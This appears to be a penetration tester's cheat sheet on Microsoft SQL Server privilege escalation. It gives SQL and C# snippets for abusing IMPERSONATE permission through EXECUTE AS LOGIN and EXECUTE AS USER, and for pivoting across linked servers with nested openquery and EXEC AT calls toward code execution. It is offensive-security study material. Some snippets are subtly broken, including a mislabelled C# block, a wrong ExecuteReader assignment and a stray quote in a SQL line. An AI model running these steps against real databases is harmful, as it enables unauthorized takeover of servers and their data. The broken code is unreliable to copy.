# MS SQL Escalation
Privilege escalation within the MSSQL Database can occur under the following conditions:
- DB misconfiguration resulting in `IMPERSONATE` permission to be set.

There are 2 variations of the impersonation technique:

## 1. EXECUTE AS LOGIN
[enumerate-impersonation-logins.cs](./Code/enumerate-impersonation-logins.cs)

Select Accounts with IMPERSONATE permission:
```sql
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
```

### Impersonate Login
If you find an account that allows impersonation, you can now try to login.
[enumerate-impersonation-access.cs](./Code/enumerate-impersonation-access.cs)
```cpp
string executesAs = "EXECUTE AS LOGIN = 'sa'";
command = command.ExecuteReader();
reader.Close();
```

## 2. EXECUTE AS USER
Conditions must be met:
- impersonation must be granted to our user for a different user that has preferably the sysadmin role.
- db user can only perform actions on current db
- Sysadmin impersonation on 1 db does not mean server wide compromise.
- db user must be in a database with `TRUSTWORTHY` property set.
- msdb has this by default
- Owner has sysadmin
- user must have privlege to impersonate dbo in msdb

The main differences between the above variation: 
[enumerate-impersonation-user.cs](./Code/enumerate-impersonation-user.cs)
```cs
string user = "SELECT USER_NAME();";
string login = "use msdb; EXECUTE AS USER = 'dbo';";
```

Once you have compromised a privileged user, time for [code-execution.md](./code-execution.md)

## 3. Linked SQL Servers
We can locate a remote server, pivot to it, then try to log back into the orginal
- Links are not bidirectional by default

To locate linked servers from a remote server:
```sql
EXEC ('sp_linkedservers') AT server-01;";
```

Determine which privileges we get on server-02 by executing a query on server-01, and inside that execute a query on server-02
- Remember to properly escape your quotes here
- Evelates privileges on server-02
```sql
SELECT myuser FROM openquery(\"server-01\", 'SELECT myuser FROM openquery(\"server-02\", ''SELECT SYSTEM_USER as myuser'')');
```

You can achieve code execution in a similar manner:
```sql
EXEC('EXEC (''sp_configure ''''show advanced options'''',1;RECONFIGURE;'') AT server-02') AT server-01;
```
